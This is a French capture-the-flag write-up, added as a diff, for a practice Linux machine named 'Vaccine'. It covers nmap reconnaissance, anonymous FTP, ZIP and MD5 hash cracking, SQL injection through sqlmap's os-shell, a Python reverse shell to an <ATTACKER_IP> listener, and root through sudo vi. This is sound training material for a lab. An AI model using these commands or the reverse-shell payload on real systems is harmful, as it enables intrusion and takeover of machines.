@@ -1,0 +1,192 @@
+---
+title: Vaccine
+description: WU Vaccine
+categories: [Writeup]
+tags: [writeup]
+template: doc
+sidebar:
+  order: 10
+  badge:
+    text: 'very easy'
+    variant: success
+---
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**VERY EASY**</span> | 10.129.x.x |
+
+## Résumé
+
+Machine Linux avec un service FTP permettant l'accès anonyme. Un fichier ZIP protégé par mot de passe contient des credentials pour un dashboard web vulnérable à l'injection SQL. Exploitation via sqlmap pour obtenir un shell, puis escalade de privilèges via sudo sur vi.
+
+---
+
+## Reconnaissance
+
+### Scan de ports
+
+```bash
+nmap -T4 <IP>
+```
+
+```shell wrap
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+```
+
+### Scan détaillé
+
+```bash
+nmap -A -p 21,22,80 <IP>
+```
+
+| Port | Service | Version |
+|------|---------|---------|
+| 21 | FTP | vsftpd 3.0.3 (anonymous login) |
+| 22 | SSH | OpenSSH 8.0p1 Ubuntu |
+| 80 | HTTP | Apache 2.4.41 |
+
+---
+
+## Enumération
+
+### FTP (21)
+
+Connexion anonyme autorisée :
+
+```bash
+ftp Anonymous@<IP>
+# Password: (vide)
+```
+
+```
+ftp> ls
+ftp> get backup.zip
+ftp> quit
+```
+
+### Cracking du ZIP
+
+Le fichier est protégé par mot de passe :
+
+```bash
+zip2john backup.zip > hash.txt
+john --wordlist=rockyou.txt hash.txt
+```
+
+### Contenu du ZIP
+
+```bash
+unzip backup.zip
+```
+
+Fichiers extraits : `index.php`, `style.css`
+
+Dans `index.php`, on trouve un hash MD5 pour l'utilisateur admin.
+
+### Cracking du hash MD5
+
+```bash
+hashcat -m 0 -a 0 <hash> rockyou.txt
+```
+
+---
+
+## Exploitation
+
+### Dashboard web
+
+Connexion sur `http://<IP>/dashboard.php` avec les credentials trouvés.
+
+Le paramètre `search` est vulnérable à l'injection SQL (PostgreSQL).
+
+### SQL Injection avec sqlmap
+
+```shell wrap
+sqlmap -u "http://<IP>/dashboard.php?search=" --os-shell --cookie="PHPSESSID=<session>"
+```
+
+Vulnérabilités détectées :
+- Boolean-based blind
+- Error-based
+- Stacked queries
+- Time-based blind
+
+Shell obtenu en tant que `postgres`.
+
+### Reverse shell
+
+Depuis l'os-shell sqlmap, utiliser un reverse shell Python :
+
+```shell wrap
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+```
+
+Listener :
+
+```bash
+nc -lvn 4444
+```
+
+### Stabilisation du shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+export SHELL=/bin/bash
+# Ctrl+Z
+stty raw -echo && fg
+```
+
+---
+
+## Escalade de privilèges
+
+### Mot de passe postgres
+
+Chercher dans les fichiers de configuration web (ex: `dashboard.php`).
+
+### Enumération sudo
+
+```bash
+sudo -l
+```
+
+L'utilisateur postgres peut exécuter vi sur un fichier spécifique en tant que root.
+
+### Exploitation via vi (GTFOBins)
+
+```bash
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+Dans vi :
+
+```
+:!/bin/bash
+```
+
+Root obtenu.
+
+---
+
+## Flags
+
+```bash
+cat /var/lib/postgresql/user.txt
+cat /root/root.txt
+```
+
+---
+
+## A retenir
+
+- Toujours vérifier l'accès FTP anonyme
+- `zip2john` + `john` pour cracker des ZIP protégés
+- Les fichiers de backup peuvent contenir des credentials en clair
+- Chercher les mots de passe dans les fichiers de config web (`dashboard.php`, `config.php`, `.env`)
+- `sudo -l` est la première commande à exécuter pour le privesc
+- vi/vim avec sudo permet d'obtenir un shell root via `:!/bin/bash`
+- Référence : [GTFOBins - vi](https://gtfobins.github.io/gtfobins/vi/)
